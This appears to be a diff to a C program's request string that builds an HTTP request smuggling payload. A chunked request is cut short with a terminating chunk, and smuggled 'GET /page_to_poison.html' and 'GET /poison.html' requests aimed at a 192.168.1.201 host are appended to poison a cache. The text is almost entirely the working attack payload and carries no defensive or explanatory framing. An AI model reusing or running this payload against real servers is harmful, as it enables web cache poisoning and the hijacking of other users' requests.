@@ -49,13 +49,14 @@ int main() {
         "Transfer-Encoding: chunked\r\n"
         "Connection: Keep-Alive\r\n"
         "\r\n"
-        "21\r\n"
-        "GET /page_to_poison.html HTTP/1.1\r\n"
-        "18\r\n"
-        "Host: 192.168.1.201\r\n0\r\n\r\n"
-        //"24\r\n"
-        "Something: GET /poison.html HTTP/1.1\r\n"
         "0\r\n\r\n"
+
+        "GET /page_to_poison.html HTTP/1.1\r\n"
+        "Host: 192.168.1.201\r\n"
+        "Something: GET /poison.html HTTP/1.1\r\n"
+        "Host: 192.168.1.201\r\n"
+        ""
+        "\r\n\r\n"
         
         //"GET /page_to_poison.html HTTP/1.1\r\n"  // Smuggled request
         //"Host: 192.168.1.201\r\n"
